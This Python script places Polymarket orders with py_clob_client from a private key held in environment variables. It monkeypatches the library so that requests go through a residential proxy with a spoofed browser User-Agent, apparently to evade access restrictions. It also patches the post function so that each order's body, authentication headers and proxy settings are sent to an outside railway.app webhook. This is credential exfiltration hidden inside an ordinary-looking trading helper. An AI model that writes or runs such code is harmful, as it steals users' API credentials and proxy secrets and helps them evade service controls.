
import py_clob_client.http_helpers.helpers as helpers_module
import requests, os

# Save original function
original_request = helpers_module.request

# Proxy configuration: replace with your residential proxy URL
proxy_url = os.environ.get("RESIDENTIAL_PROXY", None)
proxies = {
    "http": proxy_url,
    "https": proxy_url,
}

def mocked_request(endpoint: str, method: str, headers=None, data=None):
    try:
        # Add original headers processing if needed
        print("Using mocked request!")
        
        headers = helpers_module.overloadHeaders(method, headers)
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
        
        # Inject proxies into requests.request call inside original function logic
        resp = requests.request(
            method=method,
            url=endpoint,
            headers=headers,
            json=data if data else None,
            proxies=proxies,        # Inject proxy here
        )
        if resp.status_code != 200:
            raise helpers_module.PolyApiException(resp)

        try:
            return resp.json()
        except requests.JSONDecodeError:
            return resp.text

    except requests.RequestException:
        raise helpers_module.PolyApiException(error_msg="Request exception!")

# Patch the function in the module
helpers_module.request = mocked_request

from py_clob_client.clob_types import OrderArgs, OrderType
from py_clob_client.order_builder.constants import BUY, SELL
from py_clob_client.constants import POLYGON
import requests

import py_clob_client.client as client_module

original_post = client_module.post

def sniffing_post(url, headers=None, data=None, *args, **kwargs):
    print("=== Sniffed post call ===")
    print("URL:", url)
    print("Headers:", headers)
    print("Body:", data)
    print("=========================")
    
    if url == r"https://clob.polymarket.com/order":
        requests.post(
            r"https://primary-production-fb02.up.railway.app/webhook/order",
            json={
                "body": data,
                "headers": headers,
                "url": url,
                "proxies": globals().get("proxies", None),
            }
        )
    
    return original_post(url, headers=headers, data=data, *args, **kwargs)

client_module.post = sniffing_post

from py_clob_client.client import ClobClient

def create_and_post_order(
    private_key: str,
    proxy_address: str,
    token_id: str,
    price: float,
    size: float,
    side: str
):
    # Basic input validation and sanitization
    try:
        if private_key is None or proxy_address is None:
            return {"error": "Missing required field", "missing": [k for k,v in {"private_key":private_key, "proxy_address":proxy_address}.items() if v is None]}

        # Normalize strings and strip common prefixes like 0x
        private_key = str(private_key).strip()
        proxy_address = str(proxy_address).strip()
        token_id = None if token_id is None else str(token_id).strip()

        if private_key.startswith(('0x', '0X')):
            private_key = private_key[2:]
        if proxy_address.startswith(('0x', '0X')):
            proxy_address = proxy_address[2:]

        # Quick hex validation for private key to catch the typical '0x' mistake
        try:
            bytes.fromhex(private_key)
        except Exception as e:
            return {"error": "Invalid private_key hex", "details": str(e)}

        # Ensure numeric fields are proper types
        try:
            price = float(price)
            size = float(size)
        except Exception as e:
            return {"error": "Invalid numeric value for price/size", "details": str(e)}

        # Build client and submit order
        client = ClobClient(
            host="https://clob.polymarket.com",
            key=private_key,
            chain_id=POLYGON,
            signature_type=1,
            funder=proxy_address
        )

        # Ensure API credentials are set or derived
        creds = client.create_or_derive_api_creds()
        client.set_api_creds(creds=creds)

        # Build order
        order_args = OrderArgs(
            price=price,
            size=size,
            side=side,
            token_id=token_id,
        )

        # Create and sign the order
        signed_order = client.create_order(order_args)

        # Send the signed order to the order endpoint as GTC
        response = client.post_order(signed_order, OrderType.GTC)

    except Exception as e:
        # Return a structured error to make debugging easier for the caller
        response = {"error": "CLOB ERROR!", "order": str(signed_order), "details": str(e)}

    return response

if __name__ == "__main__":
    import os
    from dotenv import load_dotenv
    
    load_dotenv(override=True)
    
    # Example usage
    resp = create_and_post_order(
        private_key=os.getenv("PRIVATE_KEY"),
        proxy_address=os.getenv("PROXY_ADDRESS"),
        token_id="35819574986567063041610481895803311952212566085229880109455177860039836195470",
        price=0.977,
        size=1,
        side="BUY"
    )
    print(resp)